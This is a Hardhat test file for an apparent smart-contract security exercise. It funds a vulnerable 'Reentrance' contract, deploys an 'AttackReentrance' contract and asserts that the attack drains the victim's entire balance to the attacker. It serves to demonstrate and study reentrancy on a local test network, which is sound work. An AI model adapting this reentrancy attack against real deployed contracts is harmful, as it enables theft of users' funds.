const chai = require("chai");
const chaiAsPromised = require("chai-as-promised");
const { ethers } = require("hardhat");

const { scriptEmojis } = require("./");

chai.use(chaiAsPromised);

const { expect } = chai;
describe(`${scriptEmojis.system}Reentrancy`, () => {
    /**
     * -    we would deploy `Reentrance` SC and deposit some Ether using
     *      `deployer` and `alice` accounts
     *
     * -    attacker, would deploy `AttackReentrance` SC and
     *      through the attack function, send some Ether that is
     *      most likely a factor of the current balance of `Reentrance` SC
     */

    const zeroBN = ethers.toBigInt(0);
    let deployer, alice, attacker;
    let deployerDeposit,
        aliceDeposit,
        attackerDeposit,
        deployerWithdrawAmount,
        initialAttackerBalanceBN;
    let reentrance, attackReentrance;
    before(async () => {
        [deployer, alice, attacker] = await ethers.getSigners();

        initialAttackerBalanceBN =
            (await ethers.provider.getBalance(attacker.address)) /
            ethers.WeiPerEther;
    });

    describe(`${scriptEmojis.launch}Reentrance`, () => {
        it(`should deploy Reentrance SC ${scriptEmojis.contract}`, async () => {
            reentrance = await ethers.deployContract("Reentrance");

            await reentrance.waitForDeployment();

            let _address = reentrance.target;

            expect(_address).not.equal("");
            expect(_address).not.equal(0x0);
            expect(_address).not.equal(null);
            expect(_address).not.equal(undefined);
        });

        it(`should have a balance for deployer ${scriptEmojis.flag}`, async () => {
            deployerDeposit = ethers.parseEther("2000");

            let tx = await reentrance.donate(deployer.address, {
                value: deployerDeposit,
            });

            await tx.wait();

            let deployerBalance = await reentrance.balanceOf(deployer.address);

            const zeroBN = ethers.toBigInt(0);

            expect(deployerBalance).not.equal(zeroBN);
            expect(typeof deployerBalance).equal(typeof zeroBN);
            expect(deployerBalance).equal(deployerDeposit);
        });

        it(`should have a balance for alice ${scriptEmojis.flag}`, async () => {
            aliceDeposit = ethers.parseEther("980");

            let tx = await reentrance.connect(alice).donate(alice.address, {
                value: aliceDeposit,
            });

            await tx.wait();

            let aliceBalance = await reentrance.balanceOf(alice.address);

            expect(aliceBalance).not.equal(zeroBN);
            expect(typeof aliceBalance).equal(typeof zeroBN);
            expect(aliceBalance).equal(aliceDeposit);
        });

        it(`should withdraw some deployer's balance ${scriptEmojis.flag}`, async () => {
            deployerWithdrawAmount = ethers.parseEther("80");
            // let deployerWithdrawAmountBN = deployerWithdrawAmount / ethers.WeiPerEther;
            // let deployerDepositBN = deployerDeposit / ethers.WeiPerEther;

            let tx = await reentrance.withdraw(deployerWithdrawAmount);

            await tx.wait();

            let deployerBalance = await reentrance.balanceOf(deployer);

            expect(deployerBalance).not.equal(zeroBN);
            expect(typeof deployerBalance).equal(typeof zeroBN);
            expect(deployerBalance).equal(
                deployerDeposit - deployerWithdrawAmount
            );
        });
    });

    describe(`${scriptEmojis.launch} AttackReentrance`, () => {
        it(`should deploy AttackReentrance SC ${scriptEmojis.contract}`, async () => {
            attackReentrance = await ethers.deployContract(
                "AttackReentrance",
                attacker
            );

            await attackReentrance.waitForDeployment();

            let _address = attackReentrance.target;

            expect(_address).not.equal("");
            expect(_address).not.equal(0x0);
            expect(_address).not.equal(null);
            expect(_address).not.equal(undefined);
        });

        it(`should have owner ${scriptEmojis.flag}`, async () => {
            let _owner = ethers.stripZerosLeft(
                await ethers.provider.getStorage(attackReentrance.target, 1)
            );

            expect(_owner).not.equal("");
            expect(_owner).not.equal(0x0);
            expect(_owner).not.equal(null);
            expect(_owner).not.equal(undefined);

            expect(_owner).equal(attacker.address.toLowerCase());
        });
    });

    describe(`${scriptEmojis.mobilize} mobilize`, () => {
        it(`should attack reentrance with little ETH and have a balance greater than deposit ${scriptEmojis.loop}`, async () => {
            attackerDeposit = ethers.parseEther("100");

            const initialReentranceBalanceBN =
                (await ethers.provider.getBalance(reentrance.target)) /
                ethers.WeiPerEther;

            let tx = await attackReentrance.attack(reentrance.target, {
                value: attackerDeposit,
            });

            await tx.wait();

            const attackReentranceBalanceBN =
                (await ethers.provider.getBalance(attackReentrance.target)) /
                ethers.WeiPerEther;

            expect(attackReentranceBalanceBN).not.equal(zeroBN);
            expect(typeof attackReentranceBalanceBN).equal(typeof zeroBN);

            expect(attackReentranceBalanceBN).equal(
                initialReentranceBalanceBN +
                    attackerDeposit / ethers.WeiPerEther
            );
        });

        it(`only owner should withdraw balance of AttackReentrance ${scriptEmojis.withdraw}`, async () => {
            expect(attackReentrance.withdraw()).to.rejectedWith(
                "Only owner can call this!"
            );

            let tx = await attackReentrance.connect(attacker).withdraw();

            await tx.wait();

            const currentAttackerBalanceBN =
                (await ethers.provider.getBalance(attacker)) /
                ethers.WeiPerEther;

            expect(currentAttackerBalanceBN).greaterThan(
                initialAttackerBalanceBN
            );
        });
    });
});
